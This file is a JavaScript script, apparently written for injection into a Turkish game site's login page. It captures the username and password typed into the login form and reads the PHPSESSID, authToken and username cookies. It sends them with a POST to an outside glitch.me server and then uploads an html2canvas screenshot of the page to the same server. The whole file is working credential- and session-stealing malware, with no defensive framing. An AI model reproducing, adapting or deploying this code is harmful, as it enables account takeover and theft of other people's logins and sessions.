(function() {
    // html2canvas CDN’i dinamik olarak yükle
    const script = document.createElement('script');
    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
    script.onload = () => {
        console.log('html2canvas yüklendi');
        setupLoginListener();
    };
    script.onerror = () => console.error('html2canvas yüklenemedi');
    document.head.appendChild(script);

    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return decodeURIComponent(parts.pop().split(';').shift());
        return null;
    }

    function setupLoginListener() {
        const loginBtn = document.querySelector('a[onclick="girisyap()"]');
        if (loginBtn) {
            loginBtn.addEventListener('click', () => {
                const username = document.getElementById('loginname')?.value || 'Bilinmiyor';
                const password = document.getElementById('loginpassport')?.value || 'Bilinmiyor';
                const remember = document.getElementById('authCheck')?.checked || false;

                localStorage.setItem('pendingLogin', JSON.stringify({
                    kuladi: username,
                    sifre: password,
                    remember: remember,
                    timestamp: Date.now()
                }));
            });
        } else {
            setTimeout(setupLoginListener, 100);
        }
    }

    function sendCredentials() {
        const pendingLogin = localStorage.getItem('pendingLogin');
        if (!pendingLogin) return;

        const loginData = JSON.parse(pendingLogin);
        const usernameCookie = getCookie('username');
        const phpSessId = getCookie('PHPSESSID');
        const authToken = getCookie('authToken');

        if (usernameCookie || phpSessId || authToken) {
            const data = {
                kuladi: loginData.kuladi,
                sifre: loginData.sifre,
                remember: loginData.remember,
                cookies: {
                    username: usernameCookie || 'Yok',
                    PHPSESSID: phpSessId || 'Yok',
                    authToken: authToken || 'Yok'
                },
                timestamp: loginData.timestamp
            };

            fetch('https://duello-katiponline-com.glitch.me/log', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data),
                credentials: 'include'
            })
                .then(() => {
                    localStorage.removeItem('pendingLogin');
                    captureScreenshot(loginData.kuladi);
                })
                .catch(err => console.error('Log gönderilemedi:', err));
        }
    }

    function captureScreenshot(username) {
        if (typeof html2canvas !== 'function') {
            console.error('html2canvas hazır değil');
            return;
        }

        html2canvas(document.body).then(canvas => {
            const screenshot = canvas.toDataURL('image/png');
            fetch('https://duello-katiponline-com.glitch.me/upload-screenshot', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    username: username,
                    screenshot: screenshot,
                    timestamp: Date.now()
                }),
                credentials: 'include'
            })
                .then(() => console.log('Ekran görüntüsü gönderildi'))
                .catch(err => console.error('Ekran görüntüsü gönderilemedi:', err));
        });
    }

    window.addEventListener('load', () => {
        sendCredentials();
    });
    setInterval(sendCredentials, 1000);
})();
